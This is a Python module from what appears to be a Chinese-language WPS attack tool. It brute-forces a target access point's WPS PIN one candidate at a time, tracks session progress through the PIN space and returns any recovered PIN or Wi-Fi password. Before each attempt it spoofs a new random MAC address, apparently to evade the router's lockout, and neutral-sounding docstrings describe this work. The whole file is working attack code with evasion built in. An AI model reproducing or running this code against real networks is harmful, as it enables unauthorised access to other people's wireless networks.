"""Opt-in native candidate boundaries with verified owned-interface rotation."""
import time
from . import wps_options
from .wps_source import ensure_wps_source
from .wps_radio import ensure_wps_channel
from .wps_session import session_progress, session_directory, session_name


class WpsSourceRotation:
    def __init__(self, runner, record, target, initial):
        self.runner, self.record, self.target = runner, record, target
        self.initial = initial
        self.last_address = ""

    def next_options(self, options, cancel_event=None):
        if cancel_event is not None and cancel_event.is_set():
            raise RuntimeError("WPS \u4efb\u52a1\u5df2\u53d6\u6d88\u3002")
        for attempt in range(8):
            address = self.initial if not self.last_address and attempt == 0 else wps_options.random_source_mac()
            if address != self.last_address:
                break
        else:
            raise RuntimeError("无法生成新的随机 MAC，未启动下一候选。")
        prepared = dict(options, spoof_mac=address, spoof_mac_enabled=True)
        ensure_wps_source(self.runner, self.record, prepared, cancel_event)
        ensure_wps_channel(self.runner, self.record, self.target, cancel_event)
        self.last_address = address
        return prepared


def native_step(before, after):
    """Mirror advance_pin_count(): exactly one active index advances per native rejection."""
    if after is None:
        return "invalid"
    before = before or (0, 0, 0)
    p1, p2, state = before
    a1, a2, astate = after
    if state == 0 and astate == 0:
        valid = a1 == p1 + 1 and a2 == p2
    elif state in (0, 1) and astate == 1:
        valid = a1 == p1 and a2 == p2 + 1
    else:
        valid = False
    if not valid:
        return "invalid"
    return "exhausted" if a1 >= 10000 or a2 >= 1000 else "advanced"


def progressed(before, after):
    return native_step(before, after) == "advanced"


def run_rotating_normal(bssid, deadline, make_command, run_phase, phase_state, saved_path, no_reply, check_cancel):
    """Continue only after native one-attempt exit AND a validated advancing checkpoint."""
    previous = session_progress(session_directory() / session_name(bssid))
    pin = psk = None
    if previous is not None and (previous[2] == 2 or previous[0] >= 10000 or previous[1] >= 1000):
        return pin, psk, "保存的候选进度已到末尾，未重复启动"
    while time.monotonic() < deadline:
        check_cancel()
        command = make_command()
        check_cancel()
        remaining = deadline-time.monotonic()
        if remaining <= 0:
            break
        pin, psk = run_phase(command + " -g 1", remaining)
        if pin or psk or no_reply():
            return pin, psk, ""
        if phase_state.get("stop_reason") == "time_budget" or time.monotonic() >= deadline:
            return pin, psk, "\u5df2\u8fbe\u5230\u8bbe\u5b9a\u7684\u8fd0\u884c\u65f6\u9650"
        if not phase_state.get("native_exit") or not phase_state.get("single_limit"):
            return pin, psk, "\u5de5\u5177\u672a\u786e\u8ba4\u5b8c\u6210\u5355\u4e2a\u5019\u9009\uff0c\u5df2\u505c\u6b62\u9010\u7801\u968f\u673a"
        current = session_progress(saved_path())
        step = native_step(previous, current)
        if step == "exhausted":
            return pin, psk, "已到达候选范围末尾，本次未获得 PIN 或密码"
        if step != "advanced":
            return pin, psk, "\u672a\u786e\u8ba4\u539f\u751f\u8fdb\u5ea6\u6709\u6548\u63a8\u8fdb\uff0c\u5df2\u505c\u6b62\u9010\u7801\u968f\u673a\u5e76\u4fdd\u7559\u8fdb\u5ea6"
        previous = current
    return pin, psk, "\u5df2\u8fbe\u5230\u8bbe\u5b9a\u7684\u8fd0\u884c\u65f6\u9650"
